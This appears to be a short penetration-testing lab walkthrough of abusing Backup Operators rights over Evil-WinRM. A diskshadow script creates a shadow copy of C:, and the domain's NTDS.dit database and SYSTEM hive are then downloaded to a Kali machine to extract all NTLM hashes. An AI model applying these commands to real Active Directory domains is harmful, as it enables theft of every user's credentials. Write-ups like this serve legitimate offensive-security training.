Evil-Winrm
the user is in the Backup Operators group. There is a known exploitation technique which will abuse these privileges to escalate to the SYSTEM user. 

We can abuse this access to steal the active directory database NTDS.dit to get all the NTLM hashes for all user and computer objects in the domain.

To this end, we can use diskshadow tool to create a shadow copy of the C drive and in the E drive and can copy the NTDS.dit file from this shadow copy to our local system.

In order to exploit this vulnerability, we'll save the following content as script.txt in a file:

cat script.txt
            
set verbose onX
set metadata C:\\Windows\\Temp\\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX

Then upload to target:
*Evil-WinRM* PS C:\Users\jackie\Documents> diskshadow /s script.txt

*Evil-WinRM* PS C:\Users\jackie\Documents> download system
                                         
Info: Downloading C:\Users\jackie\Documents\system to system
 
Info: Download successful!
*Evil-WinRM* PS C:\Users\jackie\Documents> download ntds.dit
                                         
Info: Downloading C:\Users\jackie\Documents\ntds.dit to ntds.dit
 
Info: Download successful!

In case evil-winrm's download functionality doesn't work for ntds.dit file due to file size being too large, robocopy can also be used to transfer the file to our Kali box